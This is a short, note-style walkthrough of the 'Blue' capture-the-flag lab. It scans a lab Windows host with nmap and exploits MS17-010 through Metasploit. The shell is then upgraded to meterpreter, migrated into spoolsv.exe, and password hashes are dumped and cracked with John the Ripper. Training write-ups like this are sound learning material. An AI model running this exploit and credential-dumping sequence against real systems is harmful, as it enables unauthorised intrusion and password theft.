# Blue Walkthrough
Starting out with a scan of the machine using --script vuln

`nmap -sV -sC --script vuln -oX blueNmap.xml 10.10.254.37`

convert xml script to html using xslt

`xsltproc blueNmap.xml -o blueNmap.html

read with xdg-open

`xdg-open blueNmap.html

we notice that there are 3 vulnerabilites available. we are tyring to gain access to the host so we will try to exploit the Remote Code Execution Vulnerabilit in microsoft samba servers
ms17-10

open metasploit, search for the vulnerability found, use vuln, set options, and run

`msfconsole
`search ms17
`use 0
`show options
`set RHOSTS 10.10.254.37
`exploit

Exploit works and we get into the windows prompt
We will now background the sessions and get into meterpreter

`Ctrl+Z to background the session`
`sessions` check sessions

can get into meterpreter (from msfconsole) and then set session number

`use post/multi/manage/shell_to_meterpreter`
`use`
`set session 1`
`exploit`

interact with sessions by
`sessions -i 2`

[[METERPRETER]]
use `getuid` to find out who you are logged in as
check processes with `ps`
attempt to migrate to a process (**spoolsv.exe** is a good proccess to migrate to)
migrate to spoolsv.exe with `migrate [process ID]`
dump hashes `hashdump`

we noticed from our nmap scan our host computer is named john and his hashes are available
copy the hashes to a txt file and use john the ripper for password cracking

use [[JOHNRIPPER & HASHCAT]] to crack password hash, save to file
`john JohnHash.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --show`
password: alqfna22

now we browse the directory to find the flags